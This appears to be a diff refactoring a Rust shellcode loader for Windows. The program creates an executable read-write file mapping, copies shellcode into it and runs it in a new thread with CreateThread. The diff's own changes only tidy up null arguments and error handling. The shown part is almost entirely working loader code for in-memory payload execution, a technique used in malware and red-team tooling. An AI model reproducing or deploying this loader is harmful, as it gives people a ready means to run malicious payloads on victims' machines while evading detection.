@@ -1,8 +1,4 @@
-use std::{
-    process::exit,
-    ptr::{copy, null, null_mut},
-};
-
+use std::ptr::copy;
 use windows::Win32::{
     Foundation::{CloseHandle, INVALID_HANDLE_VALUE},
     System::{
@@ -41,15 +37,13 @@ fn main() {
         println!("[+] Creating a mapping file");
         let hfile = CreateFileMappingA(
             INVALID_HANDLE_VALUE,
-            Some(null()),
+            None,
             PAGE_EXECUTE_READWRITE,
             0,
             shellcode.len() as u32,
             None,
-        )
-        .unwrap_or_else(|e| {
-            eprintln!("[!] CreateFileMappingA Failed With Error: {e}");
-            exit(-1);
+        ).unwrap_or_else(|e| {
+            panic!("[!] CreateFileMappingA Failed With Error: {e}");
         });
 
         println!("[+] Mapping the file object");
@@ -65,16 +59,14 @@ fn main() {
 
         println!("[+] Creating a thread");
         let hthread = CreateThread(
-            Some(null()),
+            None,
             0,
             Some(std::mem::transmute(map_address)),
-            Some(null()),
+            None,
             THREAD_CREATION_FLAGS(0),
-            Some(null_mut()),
-        )
-        .unwrap_or_else(|e| {
-            eprintln!("[!] CreateThread Failed With Error: {e}");
-            exit(-1);
+            None,
+        ).unwrap_or_else(|e| {
+            panic!("[!] CreateThread Failed With Error: {e}");
         });
 
         println!("[+] Thread Executed!!");
